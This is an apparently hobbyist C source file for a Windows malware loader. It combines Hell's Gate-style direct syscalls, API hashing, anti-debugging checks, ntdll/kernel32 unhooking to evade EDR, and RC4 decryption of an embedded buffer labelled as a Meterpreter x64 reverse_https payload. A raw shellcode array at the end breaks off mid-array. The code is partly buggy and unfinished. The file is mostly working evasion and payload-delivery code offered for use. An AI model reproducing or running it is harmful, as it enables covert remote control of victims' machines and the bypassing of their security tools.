#include <stdio.h>
#include <stdint.h>
#include <Windows.h>
#include <winternl.h>
#include "headers.h"

//Hells Gate Additions
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD dwHash;
    WORD    wSystemCall;
    WORD    wRCXVal;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY Allocate;
    VX_TABLE_ENTRY Protect;
    VX_TABLE_ENTRY Read;
    VX_TABLE_ENTRY Write;
    VX_TABLE_ENTRY ResumeThread;
    VX_TABLE_ENTRY QueryInfoProcess;
    VX_TABLE_ENTRY Create;
    VX_TABLE_ENTRY MapViewOfSection;
} VX_TABLE, * PVX_TABLE;

//PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers

#define num_syscalls 50 //kinda expiremental , i sorta wnat this defined early on so i can just in and start populating
PVOID* pSystemCalls[num_syscalls];
VX_TABLE VxTable = { 0 };
void initializeSystemCalls() {

    if (pSystemCalls == NULL) {
        printf("Mem allocation error\n");
        exit(1);
    }
    printf("Address of pSystemCalls(it should all be zero'd....: 0x%p\n", pSystemCalls);

    printf("Size of pSystemCalls %zu\n", num_syscalls);
}
// this is what SystemFunction032 function take as a parameter
typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );
//Maldev Academy Rc4
BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

//met x64 reverse_https payload
unsigned char Rc4CipherText[] = {
        0xA8, 0xA4, 0xCE, 0x2A, 0x86, 0xD4, 0xB6, 0x85, 0x19, 0xCC, 0x21, 0x61, 0xE1, 0xC3, 0x07, 0xFD,
        0x80, 0xFB, 0x43, 0x61, 0x3C, 0x6D, 0x2C, 0xD2, 0x15, 0xE0, 0xD9, 0x01, 0x34, 0x70, 0x0B, 0xDA,
        0x4C, 0x76, 0x71, 0x77, 0xB1, 0x30, 0xED, 0x27, 0x98, 0x6B, 0xE3, 0x04, 0x6B, 0xD6, 0x14, 0x02,
        0x36, 0xE0, 0xAF, 0x27, 0x7C, 0x6B, 0x0B, 0x6B, 0x2F, 0x96, 0xC5, 0xE5, 0x85, 0x8D, 0x70, 0x06,
        0xBC, 0x8E, 0xA1, 0x65, 0xDB, 0x2A, 0x93, 0x7B, 0x29, 0x07, 0xA9, 0xC9, 0x79, 0xDD, 0x84, 0xAB,
        0xDE, 0x52, 0xD0, 0xD8, 0xF4, 0xF9, 0xCE, 0x08, 0xC3, 0xA7, 0x6B, 0x95, 0x27, 0x40, 0x6A, 0xE9,
        0xB5, 0x38, 0xC3, 0x72, 0x89, 0xCA, 0x6A, 0xA8, 0xA2, 0xE8, 0x09, 0x09, 0xA7, 0x02, 0xA6, 0xB3,
        0x37, 0x39, 0xF3, 0x0D, 0xBA, 0x80, 0xF6, 0x20, 0x38, 0xC1, 0x49, 0x50, 0x4D, 0xB8, 0xCB, 0x50,
        0xAB, 0x6E, 0x69, 0xFA, 0x49, 0xBC, 0x53, 0x4D, 0x82, 0xC2, 0x09, 0x61, 0xF5, 0x7B, 0x62, 0x1B,
        0x56, 0xA8, 0x5F, 0xEF, 0xC4, 0xFD, 0xC8, 0xC9, 0x37, 0x84, 0xF5, 0x55, 0x9A, 0xAE, 0xC9, 0x11,
        0x83, 0x29, 0x16, 0xD3, 0xA1, 0x34, 0x37, 0x2A, 0x6D, 0x73, 0x6E, 0x72, 0x85, 0x1F, 0xD7, 0xC3,
        0x31, 0x1F, 0x6C, 0xEA, 0x78, 0x58, 0x9F, 0xF4, 0x50, 0x8E, 0xF5, 0x26, 0xC9, 0x7F, 0x87, 0x1D,
        0x4C, 0x8C, 0x6E, 0xF0, 0xC0, 0xAE, 0x05, 0xE0, 0xDD, 0xEE, 0x28, 0xDF, 0x39, 0x17, 0x53, 0x42,
        0xFD, 0xDC, 0x00, 0xBD, 0x31, 0xD8, 0xA0, 0x39, 0x3C, 0x56, 0x89, 0x86, 0x6E, 0x83, 0x32, 0x4B,
        0xBD, 0x1A, 0x0E, 0xFB, 0xA8, 0x11, 0xC6, 0x9F, 0xB1, 0x7A, 0x42, 0x49, 0x84, 0x52, 0x6B, 0xB2,
        0xE6, 0xE6, 0x24, 0x0F, 0x6D, 0x42, 0xD8, 0x65, 0x3B, 0x0C, 0x96, 0x38, 0x87, 0xDD, 0xA4, 0x48,
        0xA5, 0x4C, 0x15, 0xEC, 0x69, 0x95, 0x19, 0x89, 0xD3, 0xB8, 0xD6, 0xB5, 0xAF, 0xC2, 0xF2, 0xD7,
        0x32, 0x95, 0xA5, 0x23, 0x97, 0x79, 0x2C, 0x76, 0x18, 0x84, 0x07, 0xC8, 0xC6, 0xA2, 0xE0, 0x0D,
        0x5D, 0x14, 0x18, 0x05, 0x1F, 0x3B, 0x19, 0xCD, 0xC3, 0xDB, 0x64, 0x25, 0x77, 0x10, 0xCE, 0x27,
        0x6F, 0xFA, 0xDD, 0x59, 0x62, 0x80, 0x09, 0xC1, 0x8E, 0x68, 0x1E, 0xCC, 0xE7, 0x2B, 0xA3, 0xF6,
        0x00, 0xFB, 0x13, 0xC7, 0x2E, 0x00, 0xD8, 0x35, 0x7D, 0xF3, 0xCB, 0x52, 0x64, 0x0E, 0x2B, 0x60,
        0x7A, 0xF6, 0xFF, 0x7E, 0x70, 0x8D, 0xA4, 0x08, 0xB3, 0xD5, 0x8C, 0xBB, 0x79, 0xF5, 0x5D, 0x4D,
        0x4B, 0x0E, 0xE5, 0x67, 0xA0, 0x51, 0xDE, 0x12, 0x79, 0x02, 0xA6, 0x2A, 0x9B, 0x66, 0x75, 0x41,
        0xE7, 0x21, 0xBA, 0xDD, 0x1E, 0x50, 0x98, 0xF2, 0x36, 0x39, 0x41, 0x96, 0xE4, 0x1C, 0x7C, 0x25,
        0xC9, 0xCF, 0xF0, 0x0B, 0x43, 0x11, 0xC6, 0x41, 0xA7, 0x86, 0x93, 0x10, 0x2E, 0x0A, 0xCE, 0xFF,
        0x23, 0x7D, 0xB4, 0xF5, 0x5C, 0x0B, 0xA1, 0x3F, 0x34, 0x95, 0x48, 0x62, 0x43, 0x9A, 0x98, 0x0A,
        0x08, 0xA8, 0xD0, 0xA3, 0x95, 0xE3, 0xB3, 0xAB, 0x13, 0x1D, 0x9A, 0x42, 0xB8, 0x57, 0xE1, 0x0E,
        0x8F, 0x43, 0x31, 0x5F, 0xEA, 0xE0, 0x09, 0x68, 0x89, 0x99, 0xC6, 0xEB, 0xC6, 0xA9, 0x3D, 0x3A,
        0x1B, 0x2E, 0x70, 0x27, 0x9A, 0xD2, 0x4E, 0x4A, 0xCD, 0xF4, 0xAA, 0x07, 0x9B, 0x8D, 0xA0, 0xA4,
        0x91, 0x06, 0xA0, 0x31, 0xA3, 0xF1, 0x33, 0x55, 0x36, 0x16, 0xE5, 0x28, 0xBA, 0x05, 0xAA, 0xFF,
        0xF9, 0x62, 0xB3, 0x7B, 0x02, 0x0E, 0x5A, 0x7D, 0x83, 0x87, 0xB2, 0xE0, 0x14, 0xFF, 0x2A, 0xD9,
        0xA8, 0x4E, 0xD6, 0x16, 0x0D, 0x29, 0x84, 0xD8, 0xC9, 0xC3, 0xF0, 0xE9, 0xEB, 0x40, 0xE2, 0x70,
        0x79, 0x66, 0xD4, 0xFF, 0xA5, 0xC2, 0x81, 0xE7, 0x47, 0x8F, 0xAA, 0xD5, 0xC7, 0x3A, 0x6C, 0xCE,
        0x63, 0xDF, 0x60, 0x46, 0x3B, 0xEE, 0x55, 0x6B, 0x33, 0xEB, 0x4F, 0x34, 0x2D, 0xA0, 0xAC, 0x04,
        0xCA, 0xB7, 0x70, 0xF8, 0x5A, 0x5D, 0xCC, 0xF6, 0x52, 0x26, 0x12, 0xE6, 0xD3, 0x12, 0xE3, 0x66,
        0xFE, 0xD6, 0xF3, 0xEB, 0xDA, 0x4F, 0xBB, 0xA5, 0x03, 0xD4, 0xA7, 0x3D, 0xDC, 0xF3, 0xE6, 0xEC,
        0x2C, 0xCE, 0xBE, 0x81, 0xC2, 0x59, 0xB7, 0xB1, 0x5D, 0xF2, 0x0E, 0x99, 0x01, 0x02, 0xA2, 0xD3,
        0xE4, 0xCE, 0x3F, 0xC2, 0x34, 0xAB, 0x36, 0xD1, 0xCD, 0x0D, 0x4A, 0xF7, 0x09, 0x64, 0xE0, 0xE8,
        0x71, 0x5D, 0x30, 0x65, 0xD6, 0x8E, 0x0C, 0x0E, 0x61, 0xB2, 0xEE, 0xC3, 0x04, 0x44, 0x09, 0xBF,
        0x22, 0x37, 0xDB, 0x9E, 0x64, 0x82, 0x59, 0xC1, 0xB2, 0xE8, 0xEC, 0x7A, 0x56, 0xC7, 0x08, 0x66,
        0x13, 0x73, 0xBE, 0xCA, 0xB9, 0xA0, 0xDD, 0xF3, 0x63, 0x40, 0xF4, 0xC9, 0xDA, 0xCD, 0x40, 0x21,
        0x5A, 0x52, 0xF5, 0xEF, 0xE1, 0xBD, 0x7E, 0x91, 0x66, 0x35, 0x11, 0x58, 0x59, 0xDA, 0xD1, 0x79,
        0xD1, 0x0F, 0x49, 0x45, 0xC2, 0xA7, 0x8C, 0xA6, 0xA0, 0x95, 0x93, 0xDF, 0x69, 0xD3, 0xC1, 0x5A,
        0x19, 0x24, 0xF4, 0x39, 0x37, 0xD3, 0x0A, 0xF7, 0x90, 0xBB, 0x2A, 0x0D, 0xBC, 0x65, 0x43, 0x24,
        0x23, 0xE1, 0x23, 0x65, 0xBE, 0xE5, 0x5E, 0x96, 0xA5, 0x85, 0x4D, 0xD4, 0xEC, 0x00, 0x2C, 0x9C,
        0xC1, 0x5D, 0xB8, 0xB6, 0x8D, 0xE4, 0x55, 0x89, 0x82, 0x79, 0xB5, 0x2C, 0x9F, 0x6B, 0x23, 0xC4,
        0x07, 0x4D, 0x9C, 0x00, 0x12, 0xC1, 0x6F, 0x1A, 0x07, 0x42, 0x48, 0x1F, 0xB5, 0xE1, 0xE9, 0x9D,
        0xFE, 0x79, 0x38, 0x3A, 0x8F, 0x99, 0x2D, 0x20, 0x40, 0x91, 0x56, 0x0F, 0xD7, 0x70, 0x79, 0xC6,
        0x8C, 0xBB, 0x82, 0x28, 0xAC };

DWORD gSSN = 0;
PVOID gJMP = NULL;
WORD gCurrentSyscall = 0;


unsigned char Rc4Key[] = {
        0xAD, 0x09, 0x40, 0xE9, 0x73, 0xF5, 0x00, 0x57, 0x5D, 0xD8, 0xAE, 0x89, 0x53, 0x8E, 0x05, 0x5D };

void printByteArray(const unsigned char* array, size_t size) {
    printf("Contents of the byte array:\n");
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", array[i]); // Print each byte in hexadecimal format
    }
    printf("\n", array);
}


void detectDebug() {
    // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag

    DWORD64 isDebuggerPreset = 0;

    //NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
    BOOL STATUS = NoahRead3(
        GetCurrentProcess(),
        ProcessDebugPort,
        &isDebuggerPreset,
        sizeof(DWORD64),
        NULL
    );

    if (isDebuggerPreset != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
        return TRUE;
    }
    printf("No debugger present...\n");
    DWORD64 hProcessDebugObject = NULL;

    STATUS = NoahRead3(
        GetCurrentProcess(),
        hProcessDebugObject,
        &hProcessDebugObject,
        sizeof(DWORD64),
        NULL
    );

    // If STATUS is not 0 and not 0xC0000353 (that is 'STATUS_PORT_NOT_SET')
    if (STATUS != 0x0 && STATUS != 0xC0000353) {
        printf("\t[!] NtQueryInformationProcess [2] Failed With Status : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means we are being debugged
    if (hProcessDebugObject != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
        //return TRUE;
    }
    printf("No process debuger object present...\n");

    return FALSE;
}

#define NEW_STREAM L":Noah"
BOOL DeletesSelf() {

    //still need to go back and make this myself
}


//Also not that this is essentially a custom GetModuleHandle??? 
void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr,wchar_t* DLLPath ) {
    PPEB_LDR_DATA ldr = pPEB->Ldr;
    PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = listEntry->Flink;

    printf("Entry found:\n");
    while (entry != listEntry) {
        PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (tableEntry->FullDllName.Buffer) {
            // Print the module name (wide character string)
            wprintf(L"%ls\n", tableEntry->FullDllName.Buffer);
        }

        if (tableEntry->FullDllName.Buffer && wcscmp(tableEntry->FullDllName.Buffer, DLLPath/*L"C:\\Windows\\SYSTEM32\\ntdll.dll"*/) == 0) {
            
            wprintf(L"Found %s at %p\n", tableEntry->FullDllName.Buffer,tableEntry->DllBase);
            *pBaseAddr = tableEntry->DllBase;
            return; // Successfully found and assigned the base address
        }

        entry = entry->Flink; // Move to the next entry
    }
    *pBaseAddr = NULL; // No match found, set base address to NULL
}

DWORD blah = 0;
void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory, OUT PVOID* pTextSection, OUT DWORD* sTextSection) {

    PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
    //so we get access to NT headers

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew);

    //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
    PIMAGE_SECTION_HEADER pImageSectionHeaders = IMAGE_FIRST_SECTION(pImageNtHeaders); // a macro to essentially go from base address of NtHeaders then add offset to optional header, then adding size of optional header to get the first section.
    WORD wNumberSection = pImageNtHeaders->FileHeader.NumberOfSections;
    //Now from the NT header we can extract the export address table for all fucntions within the dll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

     printf("HEREEEE\n");
    DWORD sHooked = 0;
    PVOID bruh = NULL;
    for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {

        if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
            printf("Section: %s | 0x%p,\n", pImageSectionHeaders[i].Name, pImageSectionHeaders[i].VirtualAddress);
            bruh = (PVOID)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
            sHooked = pImageSectionHeaders[i].Misc.VirtualSize;
            printf("Text Section module Pointer: 0x%p\nSize of .text Section: %d\n", bruh, sHooked);
            printf("error?");

            *pTextSection = bruh;
            *sTextSection = sHooked;
            getchar();
            printf("error?");

            break;

        }
    }
    printf("End\n");

    //While we're getting image export directory we can also populate the systemcalls list
}

// generate Djb2 hashes from wide-character input string

#define INITIAL_HASH	3731		// added to randomize 
#define INITIAL_SEED	7			// recommended to be 0 < INITIAL_SEED < 10

DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;

    return Hash;
}


BOOL GetVXTableEntry(DWORD dwDLLSize, PVOID* pSystemCalls, PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, OUT PVX_TABLE_ENTRY syscallTableEntry) {

    //Using our image export directory from the GetImageExportDir function we can use to find # of functions, function names, and the locations 
    //of those functions within their respect RVA arrays
    //Note that since they're RVA's they need to be added onto the module base address/
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals); // NOTE THIS IS A PWORD NOT A PDWORD... yeah that took about an hr of debugging to fix

    //Then we seasrch through all the functions for a function name hash that matches ours
    for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];


        if (HashStringDjb2A(pczFunctionName) == syscallTableEntry->dwHash) {
            printf("FOUND!!\n");
            printf("Function Address 0x%p\n", pFunctionAddress);
            printf("Function Name %s\n", pczFunctionName);
            printf("A: 0x%0.8X\n", HashStringDjb2A(pczFunctionName));
            printf("B: 0x%0.8X\n", syscallTableEntry->dwHash);

            syscallTableEntry->pAddress = pFunctionAddress; // I got issues landing on ret a lot and this fixed it?
            printf("0x%p", syscallTableEntry->pAddress);
            getchar();
            //hells gate on github will perform a test to see if the fucntion has been hooked -To Do list is to add maldev academy syscallhook testing here
            // 
           //Now we will search the opcodes for byte sequences relating to system calls!


            //oh wow this is actually like incredibly simple....
            WORD byteCounter = 0;
            while (TRUE) {
                //pFunctionAddress = *((PBYTE)pFunctionAddress - 10);
                //First check if pFunctionAddress is the syscall itself, if so we need to go up to start of syscall sturcture
                //Recall syscall  = 0x0f, 0x05
                //Adding 0x01 onto the memory address value every time then taking the actual value by de-referencing pointer w *
                //to see what the legit opcode is
                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0x0f && *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x05) {
                    printf("Landed on `syscall` or incremented too far\n");
                    return FALSE;
                }
                //Now check for ret as well
                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0xc3) {
                    printf("Landed on `ret` or incremented too far\n");
                    return FALSE;
                }
                // NOTE THE OPCODES OF A PROPER SYSCALL IN WIN64 SHOULD BE:
                // mov r10,rcx
                // mov rcx,SSN
                //
                //in your head just think - dereference - pbyte - location
                if (
                    *((PBYTE)pFunctionAddress + byteCounter) == 0x4c &&
                    *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x8b &&
                    *((PBYTE)pFunctionAddress + byteCounter + 2) == 0xd1 &&
                    *((PBYTE)pFunctionAddress + byteCounter + 3) == 0xb8 &&
                    *((PBYTE)pFunctionAddress + byteCounter + 6) == 0x00 && // NOTE PLUS 6 OFFSET
                    *((PBYTE)pFunctionAddress + byteCounter + 7) == 0x00    // NOTE PLUS 7 OFFSET
                    ) {

                    //Now we need to calculate the actual systemcall number which we use 4 & 5 for.
                    //
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + byteCounter); // Offset 5
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + byteCounter); // Offset 4

                    syscallTableEntry->wSystemCall = (DWORD)((high << 8) | low);
                    printf("Systemcall SSN %d\n", syscallTableEntry->wSystemCall);

                    // syscallTableEntry->pAddress = (PBYTE)0xDEADBEEF; // I got issues landing on ret a lot and this fixed it?
                   // syscallTableEntry->wSystemCall = (DWORD)58;

                    //now all thats left is to call the function using an asm 
                    break;
                }
                byteCounter++;
            }
        }

    }
    //Now begin loop to populate list of syscall locaitons

        //Now since we don't want to pass strings of APIs we will hash and compare hashes to pre-hashed list.
        //See the API_Hashing module example
    return TRUE;
}


EXTERN_C void UpdateGlobals(DWORD input) {
    printf("Indexes of systemcalls %d\n", sizeof(pSystemCalls) / sizeof(pSystemCalls[0]));
    uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
    //PVOID address = (PVOID)(0xdeadbeef);
    //uint64_t* address = (uint64_t*)0x00007FF97312D232;

    printf("Getting JMP! 0x%p\n", address);
    gJMP = address;
    uint64_t address2 = (uint64_t)address;
    PULONG oldProts = NULL;
    getchar();
    printf("Input val to UpdateGloabls: %d\n", input);
    getchar();

    if (input == 0) { //Read
        printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.Read.wSystemCall;
        getchar();
        return (DWORD)VxTable.Read.wSystemCall;
    }
    else if (input == 1) { //Write
        printf("Wow! WRite Syscall Getter called: %d\n", VxTable.Write.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.Write.wSystemCall;
        getchar();
        return (DWORD)VxTable.Write.wSystemCall;
    }
    else if (input == 2) { //Allocate
        return VxTable.Allocate.wSystemCall;
    }
    else if (input == 3) { //Protect
        printf("Wow! Protect Syscall Getter called: %d\n", VxTable.Protect.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.Protect.wSystemCall;
        getchar();
        return VxTable.Protect.wSystemCall;
    }
    else if (input == 4) { //ResumeThread
        printf("Wow! Resume Syscall Getter called: %d\n", VxTable.ResumeThread.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.ResumeThread.wSystemCall;
        getchar();
        return VxTable.ResumeThread.wSystemCall;
    }
    else if (input == 5) { //QueryInfoProcess
        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.QueryInfoProcess.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.QueryInfoProcess.wSystemCall;
        getchar();
        return VxTable.QueryInfoProcess.wSystemCall;
    }
    else if (input == 6) { //NtCreateFile
        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.Create.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.Create.wSystemCall;
        getchar();
        return VxTable.Create.wSystemCall;
    }
    else if (input == 5) { //NtMapViewOfSection
        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.MapViewOfSection.wSystemCall);
        printf("gSSN: 0x%p", &gSSN);
        gSSN = VxTable.MapViewOfSection.wSystemCall;
        getchar();
        return VxTable.MapViewOfSection.wSystemCall;
    }
    printf("Syscall input not found, check your input in C or RCX\n");

}


typedef NTSTATUS(NTAPI* pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
    );

HANDLE FetchCleanPointer(PCWSTR* DLLPath) {

    // Set up necessary structures
    UNICODE_STRING fileName;
    OBJECT_ATTRIBUTES objAttrs;
    IO_STATUS_BLOCK ioStatusBlock;
    HANDLE hFile = NULL;
    //Will setup the unicode string with the path we passed.
    

    /* Macro to help define some of the metadata for our file handle.
    #define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}
    */
        
    printf("Bruh");
    HMODULE hNtDll = LoadLibraryA("kernel32.dll");
    if (hNtDll == NULL) {
        printf("Failed to load ntdll.dll\n");
        return 1;
    }


    //char* cNtdllPath = "C:\\Windows\\System32\\ntdll.dll";
    hFile = CreateFileA(DLLPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL) {
        printf("Cannot get ntdll handle\n");
    }
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    PVOID pNtdllBuffer = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwFileSize);


    LPDWORD bytesRead = 0;
    ReadFile(hFile, &pNtdllBuffer, dwFileSize, &bytesRead , NULL);
    if (hFile == NULL) {
        printf("bruhhh");
    }
    return hFile;
}

void UnhookDLL(PVOID pModuleBase,PVOID pClean, HANDLE hCleanDLL) {

//    HANDLE hCleanNTDLL = CreateFileA("C:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

//    HANDLE hMap = CreateFileMappingA(hCleanDLL, NULL, PAGE_READONLY|SEC_IMAGE, 0, 0, NULL);

//    LPVOID pCleanNTDLL = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);


    HANDLE hCleanNTDLL = CreateFileA("c:\\windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMapping(hCleanNTDLL, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID pCleanNTDLL = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    //now we can access the file as if it were a block of memory.
    // we only need read because this is our clean version that we will copy into our .text section.

    PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
    //so we get access to NT headers

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew);

    //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
    PIMAGE_SECTION_HEADER pImageSectionHeaders = IMAGE_FIRST_SECTION(pImageNtHeaders); // a macro to essentially go from base address of NtHeaders then add offset to optional header, then adding size of optional header to get the first section.
    WORD wNumberSection = pImageNtHeaders->FileHeader.NumberOfSections;
    //Now from the NT header we can extract the export address table for all fucntions within the dll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    PVOID pTextSection = NULL;
    SIZE_T sTextSection = NULL;
    for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {

        if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
            printf("Section: %s | 0x%p | 0x%p \n", pImageSectionHeaders[i].Name, pImageSectionHeaders[i].VirtualAddress, ((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress));

            pTextSection = ((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);

            sTextSection = pImageSectionHeaders[i].Misc.VirtualSize;
            printf("Text Section Pointer: 0x%p\nSize of .text Section: %d\n", pTextSection, sTextSection);

            printf("Clean NTDLL: 0x%p\n", pCleanNTDLL);

            printf("About to unhook!\n");
            getchar();
            PDWORD pdwOldProt = NULL;
            VirtualProtect((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress, sTextSection, PAGE_EXECUTE_READWRITE, &pdwOldProt);
            printf("BEFORE UNHOOKING:\n\n");
            int offset = 400;
            int counter = 0;
            for (int i = 0; i < 10; i++) {
                for (int j = 0; j < 10; j++) {
                    printf(" %02X ", *((PBYTE)pTextSection + i + offset));
                }
                printf("\n");
            }
            memcpy(((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress), ((PBYTE)pCleanNTDLL + 0x1000), sTextSection);
            VirtualProtect(((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress), pImageSectionHeaders[i].Misc.VirtualSize, pdwOldProt, &pdwOldProt);
            counter = 0;
            printf("Memory copied\n\n");
            for (int i = 0; i < 10; i++) {
                for (int j = 0; j < 10; j++) {
                    printf(" %02X ", *((PBYTE)pTextSection + i + offset));
                }
                printf("\n");
            }
            printf("Unhooked!");
            getchar();

        }
    }


    //Now with our hooked .text found lets overwrite

}
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x56\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
